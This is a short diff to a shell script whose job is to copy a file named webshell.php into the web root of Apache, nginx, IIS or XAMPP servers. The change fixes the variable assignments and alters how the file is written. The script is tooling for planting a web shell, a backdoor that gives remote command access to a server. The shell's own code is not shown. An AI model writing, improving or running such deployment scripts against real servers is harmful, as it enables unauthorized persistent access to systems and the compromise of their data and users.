@@ -15,18 +15,18 @@ main() {
 
 	web_rootdir=""
 	if test $1 = "apache"; then
-		$web_rootdir="/var/www/html/webshell.php"
+		web_rootdir="/var/www/html/webshell.php"
 	elif test $1 = "nginx"; then 
-		$web_rootdir="/usr/local/nginx/html/webshell.php"
+		web_rootdir="/usr/local/nginx/html/webshell.php"
 	elif test $1 = "iis"; then 
-		$web_rootdir="C:\\inetpub\\wwwroot\\webshell.php"
+		web_rootdir="C:\\inetpub\\wwwroot\\webshell.php"
 	elif test $1 = "xampp"; then 
-		$web_rootdir="C:\\xampp\\htdocs\\webshell.php"
+		web_rootdir="C:\\xampp\\htdocs\\webshell.php"
 	else
 		usage
 	fi
 	
-	cat webshell.php > $web_rootdir
+	echo $(cat "./webshell.php") > $web_rootdir
 }
 
 main $@
